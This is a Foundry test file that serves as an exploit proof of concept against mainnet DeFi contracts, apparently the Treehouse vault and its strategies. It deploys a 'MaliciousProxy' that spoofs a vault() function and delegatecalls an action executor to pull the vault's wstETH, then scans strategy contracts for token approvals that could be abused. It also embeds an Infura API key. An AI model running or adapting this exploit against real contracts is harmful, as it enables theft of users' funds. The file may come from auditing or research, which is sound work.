// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IActionExecutor {
    function executeActions(
        bytes4[] calldata _actionIds,
        bytes[] calldata _actionCallData,
        uint8[][] calldata _paramMapping
    ) external payable;
}

interface IActionRegistry {
    function getAddr(bytes4 _id) external view returns (address);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

contract ChainedActionExploitTest is Test {
    address constant ACTION_EXECUTOR = 0xb1593193Bcd7CEcc3d19597658003d735D1e9E94;
    address constant ACTION_REGISTRY = 0x94aF5994EB6841e1D930C95AD0C9F89771c3073F;
    
    address constant TREEHOUSE_VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant TREEHOUSE_STRATEGY = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    
    bytes4 constant VAULT_PULL_ID = bytes4(0xfebcb52a);
    
    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_ChainedActionAttack() public {
        console.log("=== CHAINED ACTION ATTACK ===\n");
        
        uint256 vaultBalanceBefore = IERC20(wstETH).balanceOf(TREEHOUSE_VAULT);
        console.log("Treehouse Vault wstETH before:", vaultBalanceBefore / 1e18);
        
        vm.startPrank(attacker);
        
        // Deploy malicious proxy with vault() function
        MaliciousProxy maliciousProxy = new MaliciousProxy(TREEHOUSE_VAULT, attacker);
        console.log("Malicious proxy deployed:", address(maliciousProxy));
        console.log("Proxy vault() returns:", maliciousProxy.vault());
        
        // Check VaultPull action address
        address vaultPullAction = IActionRegistry(ACTION_REGISTRY).getAddr(VAULT_PULL_ID);
        console.log("VaultPull action:", vaultPullAction);
        
        // Prepare VaultPull action call
        bytes memory vaultPullData = abi.encode(wstETH, vaultBalanceBefore);
        
        bytes4[] memory actionIds = new bytes4[](1);
        actionIds[0] = VAULT_PULL_ID;
        
        bytes[] memory actionCalldata = new bytes[](1);
        actionCalldata[0] = vaultPullData;
        
        uint8[][] memory paramMapping = new uint8[][](1);
        paramMapping[0] = new uint8[](0);
        
        console.log("\n--- Executing chained attack through proxy ---");
        
        bytes memory executeActionsCall = abi.encodeWithSelector(
            IActionExecutor.executeActions.selector,
            actionIds,
            actionCalldata,
            paramMapping
        );
        
        try maliciousProxy.execute(ACTION_EXECUTOR, executeActionsCall) returns (bytes32 result) {
            console.log("Execute succeeded!");
            console.logBytes32(result);
        } catch Error(string memory reason) {
            console.log("Execute failed:", reason);
        } catch (bytes memory lowLevelData) {
            console.log("Execute failed (low level):");
            console.logBytes(lowLevelData);
        }
        
        vm.stopPrank();
        
        uint256 vaultBalanceAfter = IERC20(wstETH).balanceOf(TREEHOUSE_VAULT);
        uint256 proxyBalance = IERC20(wstETH).balanceOf(address(maliciousProxy));
        
        console.log("\n--- Results ---");
        console.log("Treehouse Vault wstETH after:", vaultBalanceAfter / 1e18);
        console.log("Proxy wstETH:", proxyBalance / 1e18);
        
        if (vaultBalanceAfter < vaultBalanceBefore) {
            console.log("\n!!! FUNDS DRAINED FROM VAULT !!!");
        }
    }

    function test_CheckStrategyApprovals() public view {
        console.log("=== CHECKING STRATEGY TOKEN APPROVALS ===\n");
        
        address[] memory potentialSpenders = new address[](5);
        potentialSpenders[0] = TREEHOUSE_VAULT;
        potentialSpenders[1] = ACTION_EXECUTOR;
        potentialSpenders[2] = address(0x313Ca6136521D22A7Ea763B3566Ed0B53F5B3AB9);
        potentialSpenders[3] = address(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
        potentialSpenders[4] = address(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
        
        console.log("Strategy wstETH balance:", IERC20(wstETH).balanceOf(TREEHOUSE_STRATEGY));
        
        for (uint i = 0; i < potentialSpenders.length; i++) {
            uint256 allowance = IERC20(wstETH).allowance(TREEHOUSE_STRATEGY, potentialSpenders[i]);
            if (allowance > 0) {
                console.log("Strategy approved:", potentialSpenders[i]);
                console.log("Allowance:", allowance);
            }
        }
    }

    function test_ExploitViaTransferFrom() public {
        console.log("=== EXPLOIT VIA TRANSFERFROM ===\n");
        
        // What if there's an action that does transferFrom that we can exploit?
        // If Strategy has approved some contract for wstETH,
        // and that contract (or an action running in its context) can be called by us
        
        // Check all 4 strategies for approvals
        address[4] memory strategies = [
            0x60d2D94aCB969CA54e781007eE89F04c1A2e5943,
            0x5aE0e44DE96885702bD99A6914751C952d284938,
            0xB27D688Ac06a441c005657971B11521e80CdcE98,
            0xbfdF0aF6Df48E645Bd076802B95DDEf0b1E02a9d
        ];
        
        for (uint s = 0; s < strategies.length; s++) {
            console.log("\nStrategy:", strategies[s]);
            console.log("wstETH balance:", IERC20(wstETH).balanceOf(strategies[s]));
            
            // Check MAX_UINT approval to common addresses
            address[5] memory spenders = [
                address(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0), // wstETH
                address(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2), // Aave
                address(0xC13e21B648A5Ee794902342038FF3aDAB66BE987), // Spark
                TREEHOUSE_VAULT,
                ACTION_EXECUTOR
            ];
            
            for (uint i = 0; i < spenders.length; i++) {
                uint256 allowance = IERC20(wstETH).allowance(strategies[s], spenders[i]);
                if (allowance > 0) {
                    console.log("  Approved:", spenders[i], "Amount:", allowance);
                }
            }
        }
    }
}

contract MaliciousProxy {
    address public vault;
    address public owner;
    
    constructor(address _vault, address _owner) {
        vault = _vault;
        owner = _owner;
    }
    
    function execute(address _target, bytes memory _data) external payable returns (bytes32 response) {
        require(msg.sender == owner, "Not owner");
        
        assembly {
            let succeeded := delegatecall(gas(), _target, add(_data, 0x20), mload(_data), 0, 32)
            response := mload(0)
            
            switch succeeded
            case 0 {
                returndatacopy(0, 0, returndatasize())
                revert(0, returndatasize())
            }
        }
    }
    
    receive() external payable {}
}
